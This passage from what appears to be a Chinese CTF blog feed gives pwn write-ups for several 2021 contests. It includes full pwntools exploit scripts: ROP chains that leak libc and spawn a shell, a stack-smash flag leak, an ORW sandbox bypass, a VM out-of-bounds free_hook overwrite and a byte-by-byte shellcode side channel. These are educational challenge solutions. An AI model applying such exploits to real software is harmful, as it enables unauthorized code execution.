class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.send(payload)<br>p.recvline()<br>puts = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Try harder!&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(canary) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="easycho"><a href="#easycho" class="headerlink" title="easycho"></a>easycho</h2><p>这题是stack smash，程序把flag读到了.bss上，又有地方可以写泄露pie地址，获得pie地址，也就获得了flag地址，之后通过栈溢出把argv[0]改为指向flag，在引发stack_chk_fail后打印出flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;182.116.62.85&quot;</span>,<span class="hljs-number">24842</span>)<br><span class="hljs-comment">#p = process(&#x27;./easyecho&#x27;)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b *$rebase(0xB1D)&quot;)</span><br>p.recvuntil(<span class="hljs-string">&quot;Name: &quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span>)<br>pie = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xcf0</span><br>flag_addr = <span class="hljs-number">0x0000000000202040</span> + pie<br>log.info(<span class="hljs-built_in">hex</span>(pie))<br>p.recvuntil(<span class="hljs-string">&quot;Input: &quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;backdoor&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Input: &quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x168</span> + p64(flag_addr))<br>p.sendlineafter(<span class="hljs-string">&quot;Input: &quot;</span>,<span class="hljs-string">&#x27;exitexit&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>攻防世界有原题<a href="https://blog.csdn.net/seaaseesa/article/details/103093182/">https://blog.csdn.net/seaaseesa/article/details/103093182/</a></p>
<h2 id="onecho"><a href="#onecho" class="headerlink" title="onecho"></a>onecho</h2><p>这题比赛没出，好好写写wp</p>
<p><img src="/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/image-20211104101634726.png"><span class="image-caption">image-20211104101634726</span></p>
<p>32位，没开Canary以及PIE</p>
<p><img src="/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/image-20211104101940063.png"><span class="image-caption">image-20211104101940063</span></p>
<p>文件开了沙箱，禁用了execve，显然orw题目</p>
<p><img src="/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/image-20211104102233428.png"><span class="image-caption">image-20211104102233428</span></p>
<p>scanf的参数是用的%s，存在着溢出点</p>
<p><img src="/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/image-20211104163835309.png"><span class="image-caption">image-20211104163835309</span></p>
<p>十分要注意的是不能随便破坏memcpy的参数，存放在返回地址后面，所以这边要写入一个可写的地址进去作为memcpy的参数，因为程序没开PIE，所以bss地址是已知的，选择用bss修复参数。做题时就是这个地方卡住了，一下子没想到memcpy的参数被破坏了，但是又要执行完memcpy才能退栈，所以一直到这边程序就中断了。</p>
<p>所以要先在在伪造出参数，但是参数会阻碍rop的连续，所以返回地址需要填上个gadget把该参数去除，继续执行后面的布置函数进行泄露地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload += p32(read) + p32(pop3_ret) + p32(<span class="hljs-number">0</span>) + p32(bss) + p32(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure>

<p>跟上面的去除参数影响一样，因为32位参数是在栈上的，为了rop能够执行后面的函数，那么就要让返回地址是一个gadget，并且要能清除栈上填满的三个参数，所以payload才会是这么写的</p>
<p>然后最后rop链读取flag的 read 和 write 只能用plt的，不能直接使用libc地址的，不然就直接中断了，原因不知，没去深究</p>
<p><img src="/2021/10/08/2021-10-08-2021%E9%B9%A4%E5%9F%8E%E6%9D%AFPWN/image-20211104171620117.png"><span class="image-caption">image-20211104171620117</span></p>
<p>成功！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&quot;182.116.62.85&quot;,24143)</span><br>elf = ELF(<span class="hljs-string">&#x27;./onecho&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_i386/libc-2.31.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.31-0ubuntu9.2_i386/ld-2.31.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br>main = <span class="hljs-number">0x0804973F</span><br>pop_ebx = <span class="hljs-number">0x08049022</span><br>pop4_ret = <span class="hljs-number">0x08049810</span> <span class="hljs-comment">#pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br>pop3_ret = <span class="hljs-number">0x08049811</span> <span class="hljs-comment">#pop esi ; pop edi ; pop ebp ; ret</span><br>bss = <span class="hljs-number">0x0804C000</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment">#gdb.attach(p,&#x27;b *0x0804966D&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;[*] Input your name:\n&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x110</span> + p32(pop_ebx) + p32(bss) + p32(puts_plt) + p32(main) + p32(puts_got) <br>p.sendline(payload)<br>puts = u32(p.recv(<span class="hljs-number">4</span>))<br>success(<span class="hljs-string">&quot;puts:&quot;</span> + <span class="hljs-built_in">hex</span>(puts)) <br>libc_base = puts - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>success(<span class="hljs-string">&quot;libc_base:&quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&quot;open&quot;</span>]<br>read = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x110</span><br>payload += p32(pop_ebx) + p32(bss)<br>payload += p32(read) + p32(pop3_ret) + p32(<span class="hljs-number">0</span>) + p32(bss) + p32(<span class="hljs-number">8</span>)<br>payload += p32(<span class="hljs-built_in">open</span>) + p32(pop3_ret) + p32(bss) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload += p32(read) + p32(pop3_ret) + p32(<span class="hljs-number">3</span>) + p32(bss) + p32(<span class="hljs-number">0x30</span>)<br>payload += p32(write) + p32(pop3_ret) + p32(<span class="hljs-number">1</span>) + p32(bss) + p32(<span class="hljs-number">0x30</span>)<br><br><br>p.sendlineafter(<span class="hljs-string">&quot;[*] Input your name:\n&quot;</span>,payload)<br>p.sendline(<span class="hljs-string">&quot;./flag\x00&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实题目都挺简单，倒二两题是赛后复现的，说起来都没有很难，但是却能学到挺多东西的，比如倒数第二题，认真学了realloc的作用；倒一呢，更加提醒如果要程序正常一定要保证在真正执行到ret前的每一步都是要没问题的，要认真地结合汇编与gdb单步调试，观察为什么程序就断了，比赛时就没想到，我觉得这不应该，所以这题十分认真地一步步调试、观察，最终复现</p>
<p>另外开心一下，也算是另类“AK”了，虽然他不难，虽然我是赛后补全，哈哈，继续加油吧</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>VM pwn</title>
    <url>/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次做VM pwn，虽然全程是跟着诸多大佬博客走的，但总得还是个里程碑，在pwn的路上走的更远了一些。pwn👶也想变成pwn👴，不知道这天还有多远~</p>
<p>wp来源：</p>
<p><a href="https://blog.csdn.net/A951860555/article/details/117214601?spm=1001.2014.3001.5501">https://blog.csdn.net/A951860555/article/details/117214601?spm=1001.2014.3001.5501</a></p>
<p><a href="https://www.cnblogs.com/lemon629/p/13975686.html">https://www.cnblogs.com/lemon629/p/13975686.html</a></p>
<p><a href="https://blog.csdn.net/seaaseesa/article/details/105862737">https://blog.csdn.net/seaaseesa/article/details/105862737</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/257132453">https://zhuanlan.zhihu.com/p/257132453</a></p>
<h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><p>题目来自buuoj</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211004113441697.png"><span class="image-caption">image-20211004113441697</span></p>
<p>常规checksec一下，64位，stack没开</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191907462.png"><span class="image-caption">image-20211005191907462</span></p>
<p>主函数的代码审计</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191927756.png"><span class="image-caption">image-20211005191927756</span></p>
<p>fetch函数的话，取出pc指向的指令，并自动加1，指向下一条</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005192113608.png"><span class="image-caption">image-20211005192113608</span></p>
<p>execute函数的代码审计，下面是根据代码整合出来的指令表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">instr  --&gt;  op | num1 | num2 | num3  4B 32bit<br>op:<br>0x10 --&gt; reg[num1] = unsigned_byte(instr)<br>0x20 --&gt; reg[num1] = (byte(instr) == 0)<br>0x30 --&gt; reg[num1] = memory[reg[num3]] --&gt; mov mem, reg<br>0x40 --&gt; memory[reg[num3]] = reg[num1] --&gt; mov reg, mem<br>0x50 --&gt; stack[sp++] = reg[num1] --&gt; push reg<br>0x60 --&gt; reg[num1] = stack[--sp] --&gt; pop reg<br>0x70 --&gt; reg[num1] = reg[num3] + reg[num2] --&gt; add<br>0x80 --&gt; reg[num1] = reg[num2] - reg[num3] --&gt; sub<br>0x90 --&gt; reg[num1] = reg[num3] &amp; reg[num2] --&gt; and<br>0xA0 --&gt; reg[num1] = reg[num3] | reg[num2] --&gt; or<br>0xB0 --&gt; reg[num1] = reg[num3] ^ reg[num2] --&gt; xor  <br>0xC0 --&gt; reg[num1] = reg[num2] &lt;&lt; reg[num3]--&gt; shl<br>0xD0 --&gt; reg[num1] = reg[num2] &gt;&gt; reg[num3]--&gt; shr<br>0XE0 and else --&gt; exit<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005183901799-16334329637311.png"><span class="image-caption">image-20211005183901799</span></p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005191434825.png"><span class="image-caption">image-20211005191434825</span></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">知识补充：<br>movsx 有符号扩展，并传送。通过符号进行判断，如果符号位是0，则扩展的全都是0，如果是1，则扩展的全都是1。而该题中的movsxd是一样的，可能是因为是从ecx拓展为rdx<br>movzx 无符号扩展，并传送。所以一般适用在无符号的小数值拷贝到大数值里面<br>两个指令扩展的位数都和目的操作寄存器的位数一致<br></code></pre></td></tr></table></figure>

<p>结合汇编一起看，可以发现，数组下标没有禁止为负数的情况，所以是可以向上访问到got表，从而把函数地址放入寄存器中，获得函数地址。但是这边要注意，寄存器跟内存是4字节的，而泄露的地址是6字节的，、所以要用两个寄存器分别存放高四字节和低四字节</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005195005486.png"><span class="image-caption">image-20211005195005486</span></p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005195011712.png"><span class="image-caption">image-20211005195011712</span></p>
<p>然后就是退出execute时，会往之前申请的堆块里面写入内容，再释放掉。但是因为这个堆块的地址是存放在.bss上的，在上面的数组越界同样可以修改，所以可以改为free_hook - 0x8，改为这个是因为我们要释放得是一块含有/bin/sh的堆块，所以要先有位置填充/bin/sh，然后再写入system函数。</p>
<p>声明：我下面的图都是忘了-0x8的，后面懒得再截图了</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005210317826.png"><span class="image-caption">image-20211005210317826</span></p>
<p>可以看见，一顿操作后，寄存器上确实存放了一个libc地址，计算与free_hook的偏移即可</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005211732444.png"><span class="image-caption">image-20211005211732444</span></p>
<p>然后通过0x10一个字节一个字节的加，最终改成free_hook</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005212732683.png"><span class="image-caption">image-20211005212732683</span></p>
<p>跟第一步一样，把free_hook地址写入comment</p>
<p>然后就是输入/bin/sh以及system函数，即可getshell！</p>
<p><img src="/2021/10/04/2021-10-04-VMpwn%E5%85%A5%E9%97%A8/image-20211005213743697.png"><span class="image-caption">image-20211005213743697</span></p>
<p>成功！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28420</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b *main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">input_code</span>(<span class="hljs-params">op,num1,num2,num3</span>):</span><br>    code = (op&lt;&lt;<span class="hljs-number">24</span>) + (num1&lt;&lt;<span class="hljs-number">16</span>) + (num2&lt;&lt;<span class="hljs-number">8</span>) + num3<br>    p.sendline(<span class="hljs-built_in">str</span>(code))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">instr  --&gt;  op | num1 | num2 | num3  4B 32bit</span><br><span class="hljs-string">op:</span><br><span class="hljs-string">0x10 --&gt; reg[num1] = unsigned_byte(instr)</span><br><span class="hljs-string">0x20 --&gt; reg[num1] = (byte(instr) == 0)</span><br><span class="hljs-string">0x30 --&gt; reg[num1] = memory[reg[num3]] --&gt; mov reg, mem</span><br><span class="hljs-string">0x40 --&gt; memory[reg[num3]] = reg[num1] --&gt; mov mem, reg</span><br><span class="hljs-string">0x50 --&gt; stack[sp++] = reg[num1] --&gt; push reg</span><br><span class="hljs-string">0x60 --&gt; reg[num1] = stack[--sp] --&gt; pop reg</span><br><span class="hljs-string">0x70 --&gt; reg[num1] = reg[num3] + reg[num2] --&gt; add</span><br><span class="hljs-string">0x80 --&gt; reg[num1] = reg[num2] - reg[num3] --&gt; sub</span><br><span class="hljs-string">0x90 --&gt; reg[num1] = reg[num3] &amp; reg[num2] --&gt; and</span><br><span class="hljs-string">0xA0 --&gt; reg[num1] = reg[num3] | reg[num2] --&gt; or</span><br><span class="hljs-string">0xB0 --&gt; reg[num1] = reg[num3] ^ reg[num2] --&gt; xor  </span><br><span class="hljs-string">0xC0 --&gt; reg[num1] = reg[num2] &lt;&lt; reg[num3]--&gt; shl</span><br><span class="hljs-string">0xD0 --&gt; reg[num1] = reg[num2] &gt;&gt; reg[num3]--&gt; shr</span><br><span class="hljs-string">0xE0 and else --&gt; exit</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;PCPC: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;SP: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;CODE SIZE: &quot;</span>,<span class="hljs-string">&#x27;18&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;CODE: &quot;</span>)<br><span class="hljs-comment">#写入libc</span><br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">26</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">25</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x30</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>input_code(<span class="hljs-number">0x30</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">#6</span><br><span class="hljs-comment">#修改libc</span><br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br>input_code(<span class="hljs-number">0xC0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xa0</span>)<br>input_code(<span class="hljs-number">0x70</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br>input_code(<span class="hljs-number">0x70</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>) <span class="hljs-comment">#6</span><br><span class="hljs-comment">#修改comment</span><br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>)<br>input_code(<span class="hljs-number">0x80</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>)<br>input_code(<span class="hljs-number">0x40</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>)<br>input_code(<span class="hljs-number">0x40</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>) <br>input_code(<span class="hljs-number">0xE0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) <span class="hljs-comment">#6</span><br>p.recvuntil(<span class="hljs-string">&quot;R1: &quot;</span>)<br>addr1 = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">&quot;R2: &quot;</span>)<br>addr2 = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">4</span>),<span class="hljs-number">16</span>)<br>addr = (addr2&lt;&lt;<span class="hljs-number">32</span>) + addr1 - <span class="hljs-number">0x3c67a0</span><br>log.info(<span class="hljs-string">&quot;libc_base: 0x%x&quot;</span> %addr)<br>p.recvuntil(<span class="hljs-string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + addr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所谓VM pwn，就是模拟虚拟机的底层运行机制，大逻辑上拥有内存、寄存器，内存细分还有堆栈等等，以及自己的一套指令集，所以如果就算碰到不是上面的给了符号表的，也可以通过这个大逻辑自己进行理解性的还原代码，使得代码更好阅读。这类型的pwn题难点更多就是在于代码逻辑的理解，知道指令集的操作，再找寻里面出现的漏洞，要具备十足的耐心，毕竟现在2021的题目肯定比上面复杂很多很多。</p>
<p>然后呢在分析虚拟机实现了哪些指令时，可以从下面两个大方向入手：首先找到虚拟实现的内存以及寄存器，比如程序可能单独malloc几块内存用来当作寄存器或者栈空间，亦或者就用全局变量来实现；第二步就是读代码逻辑，分析指令。有字符串，可以直接根据提示的字符串识别；没有字符串，则根据指令<code>操作码</code>和<code>操作数</code>构成，操作数的个数还可分为一操作数指令、两操作数指令以及三操作数指令等概念加入到代码逻辑的阅读中，帮助我们快速分析和理解。</p>
<p>最后在调用寄存器进行布局getshell时，最好是要把代码中的指令进行整合，就像上面整合的一样，这样可以在写脚本，迅速知道操作码的取值以及操作对象的值</p>
<p>然后，加油！</p>
]]></content>
      <tags>
        <tag>VMpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2021蓝帽杯</title>
    <url>/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前还是个菜鸡，只把题目收集了，现在。。。还是菜鸡，但感觉鸡腿🍖可能大了点，来复现一下蓝帽杯的题目，持续更新吧，目前应该能更新到半决赛，为什么没有总决赛？因为没有wp也没有附件</p>
<p>wp：</p>
<p><a href="https://blog.csdn.net/qq_43678263/article/details/116277524">https://blog.csdn.net/qq_43678263/article/details/116277524</a></p>
<p><a href="https://www.lintstar.top/2020/12/784edd2e#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9-3">https://www.lintstar.top/2020/12/784edd2e#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9-3</a></p>
<h2 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h2><p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002191216443.png"><span class="image-caption">image-20211002191216443</span></p>
<p>常规checksec，64位保护全开</p>
<p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002191600919.png"><span class="image-caption">image-20211002191600919</span></p>
<p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002192200578.png"><span class="image-caption">image-20211002192200578</span></p>
<p>程序非常简单，就这么几行代码。开了沙箱，只能使用 open 和 read </p>
<p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002193705578.png"><span class="image-caption">image-20211002193705578</span></p>
<p>mmap申请到的内存位于0x10000~0x11000</p>
<p>因为会读取我们输入的数据放置到0x10000上，并且会进行调用执行，所以就是读取flag，但是因为没有write函数可以执行，那就进行单个字节的对比爆，即读取flag到一块内存区域，随后单字节爆破，在shellcode中设置loop循环，一旦cmp命中就让程序卡死，否则执行后面的exit因为沙箱禁用程序崩溃退出，根据程序的表现可以区分是否命中，注意因为服务器通信不稳定，每次读到一段flag就更新exp中的flag字符串继续向后爆破</p>
<p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211003084329468.png"><span class="image-caption">image-20211003084329468</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">dis,char</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Welcome to silent execution-box.\n&quot;</span>)<br>    sc = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            mov r12,0x67616c66</span><br><span class="hljs-string">            push r12</span><br><span class="hljs-string">            mov rdi,rsp</span><br><span class="hljs-string">            xor esi,esi</span><br><span class="hljs-string">            xor edx,edx</span><br><span class="hljs-string">            mov al,2</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            mov rdi,rax</span><br><span class="hljs-string">            mov rsi,0x10700</span><br><span class="hljs-string">            mov dl,0x40</span><br><span class="hljs-string">            xor rax,rax</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            mov dl, byte ptr [rsi+&#123;&#125;]</span><br><span class="hljs-string">            mov cl, &#123;&#125;</span><br><span class="hljs-string">            cmp cl,dl</span><br><span class="hljs-string">            jz loop</span><br><span class="hljs-string">            mov al,60</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            loop:</span><br><span class="hljs-string">            jmp loop</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(dis,char))<br>    p.send(sc)<br>flag = <span class="hljs-string">&quot;flag&#123;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">35</span>):<br>    sleep(<span class="hljs-number">1</span>)<br>    log.success(<span class="hljs-string">&quot;flag : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>,<span class="hljs-number">0x80</span>):<br>        p = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            exp(i,j)<br>            p.recvline(timeout=<span class="hljs-number">1</span>)<br>            flag += <span class="hljs-built_in">chr</span>(j)<br>            p.send(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>            log.success(<span class="hljs-string">&quot;&#123;&#125; pos : &#123;&#125; success&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">chr</span>(j)))<br>            p.close()<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:           <br>            p.close()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>2021绿城杯</title>
    <url>/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次PWN题对我这种pwn👶可算是友好至极阿，感受一下大佬在比赛中的杀穿的快感！不过还是不要被这些假象迷了眼，其实还是个蹒跚学步的pwn👶，继续加油！</p>
